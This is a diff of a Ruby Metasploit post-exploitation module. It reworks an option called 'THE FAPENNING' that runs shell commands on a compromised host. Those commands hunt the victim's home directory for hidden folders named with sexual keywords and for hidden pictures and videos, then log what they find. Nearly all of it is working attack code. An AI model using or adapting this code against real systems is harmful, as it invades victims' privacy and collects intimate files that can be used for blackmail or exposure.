@@ -485,57 +485,46 @@ def run
 
 
 
+    #
+    # Run agressive scans againts target ..
+    # if sellected previous in advanced options (set THE_FAPENNING true) ..
+    #
+    if datastore['THE_FAPENNING'] == true
+      print_status("List remote hidden porn folders/files ..")
+      Rex::sleep(0.5)
+      #
+      # bash commands to be executed remotely ..
+      # clean local variables to accept new data inputs
+      #
+      fap_dir=''
+      fap_pic=''
+      fap_vid=''
+      fap_dir = cmd_exec("di=`ls -ApR ~/ | egrep \"^\\..*/$\" | egrep -iw \"adult|sex|sexy|hot|horny|teens|fuck|girls|nude|nudes|naked|pornography|porn|youporn|xvideos|xxx\"`; locate $di")
+      fap_pic = cmd_exec("pi=`ls -ABR ~/ | grep \"^\\.\" | egrep -i \".bmp|.png|.jpg|.jpeg|.exitf\"`; locate $pi | grep -v \"Trash\"")
+      fap_vid = cmd_exec("jk=`ls -ABR ~/ | grep \"^\\.\" | egrep -i \".ogv|.mp4|.mpg|.webm\"`; du -a ~/ | grep \"$jk\" | awk {'print $2'}")
         #
-        # Run agressive scans againts target ..
-        # if sellected previous in advanced options (set THE_FAPENNING true) ..
+        # store data into a local variable (data_dump) ..
+        # to be able to write the logfile and display the outputs ..
         #
-        if datastore['THE_FAPENNING'] == true
-          print_status("List remote hidden porn folders/files ..")
-          Rex::sleep(0.5)
-          # clean local variables to accept new data inputs
-          fap_dir=''
-          fap_pic=''
-          fap_vid=''
-          #
-          # bash commands to be executed remotely ..
-          #
-          if system_lang =~ /C/ || system_lang =~ /'C'/ || system_lang =~ /pt_PT/
-            fap_dir = cmd_exec("di=`ls -ApR ~/ | egrep \"^\\..*/$\" | egrep -iw \"adult|sex|sexy|hot|horny|teens|fuck|girls|nude|nudes|naked|pornography|porn|youporn|xvideos|xxx\"`; locate $di")
-            fap_pic = cmd_exec("pi=`ls -ABR ~/Imagens | grep \"^\\.\" | egrep -i \".bmp|.png|.jpg|.jpeg|.exitf\"`; locate $pi")
-            fap_vid = cmd_exec("ls -ABR ~/ | grep \"^\\.\" | egrep -i \".ogv|.mp4|.mpg|.webm\"")
-          elsif system_lang =~ /fr_FR/
-            fap_dir = cmd_exec("di=`ls -ApR ~/ | egrep \"^\\..*/$\" | egrep -iw \"adult|sex|sexy|hot|horny|teens|fuck|girls|nude|nudes|naked|pornography|porn|youporn|xvideos|xxx\"`; locate $di")
-            fap_pic = cmd_exec("pi=`ls -ABR ~/Images | grep \"^\\.\" | egrep -i \".bmp|.png|.jpg|.jpeg|.exitf\"`; locate $pi")
-            fap_vid = cmd_exec("ls -ABR ~/ | grep \"^\\.\" | egrep -i \".ogv|.mp4|.mpg|.webm\"")
-          elsif system_lang =~ /it_IT/
-            fap_dir = cmd_exec("di=`ls -ApR ~/ | egrep \"^\\..*/$\" | egrep -iw \"adult|sex|sexy|hot|horny|teens|fuck|girls|nude|nudes|naked|pornography|porn|youporn|xvideos|xxx\"`; locate $di")
-            fap_pic = cmd_exec("pi=`ls -ABR ~/Immagini | grep \"^\\.\" | egrep -i \".bmp|.png|.jpg|.jpeg|.exitf\"`; locate $pi")
-            fap_vid = cmd_exec("ls -ABR ~/ | grep \"^\\.\" | egrep -i \".ogv|.mp4|.mpg|.webm\"")
-          else
-            cmd_exec("di=`ls -ApR ~/ | egrep \"^\\..*/$\" | egrep -iw \"adult|sex|sexy|hot|horny|teens|fuck|girls|nude|nudes|naked|pornography|porn|youporn|xvideos|xxx\"`; locate $di")
-            cmd_exec("pi=`ls -ABR ~/Images | grep \"^\\.\" | egrep -i \".bmp|.png|.jpg|.jpeg|.exitf\"`; locate $pi")
-            cmd_exec("ls -ABR ~/ | grep \"^\\.\" | egrep -i \".ogv|.mp4|.mpg|.webm\"")
-          end
-            #
-            # store data into a local variable (data_dump) ..
-            # to be able to write the logfile and display the outputs ..
-            #
-            print_status("Storing scan results into msf database ..")
-            Rex::sleep(0.7)
-            data_dump << "+--------------------------------+\n"
-            data_dump << "|         THE FAPENNING          |\n"
-            data_dump << "+--------------------------------+\n"
-            data_dump << "\n\n"
-            data_dump << "HIDDEN DIRECTORYS FOUND:\n"
-            data_dump << fap_dir
-            data_dump << "\n\n"
-            data_dump << "HIDDEN PICTURES FOUND:\n"
-            data_dump << fap_pic
-            data_dump << "\n\n"
-            data_dump << "HIDDEN VIDEOS FOUND:\n"
-            data_dump << fap_vid
-            data_dump << "\n\n"
-        end
+        print_status("Storing scan results into msf database ..")
+        Rex::sleep(0.7)
+        data_dump << "+--------------------------------+\n"
+        data_dump << "|         THE FAPENNING          |\n"
+        data_dump << "+--------------------------------+\n"
+        data_dump << "\n\n"
+        data_dump << "HIDDEN DIRECTORYS FOUND:\n"
+        data_dump << "------------------------\n"
+        data_dump << fap_dir
+        data_dump << "\n\n\n"
+        data_dump << "HIDDEN PICTURES FOUND:\n"
+        data_dump << "----------------------\n"
+        data_dump << fap_pic
+        data_dump << "\n\n\n"
+        data_dump << "HIDDEN VIDEOS FOUND:\n"
+        data_dump << "--------------------\n"
+        data_dump << fap_vid
+        data_dump << "\n\n\n"
+    end
 
 
 
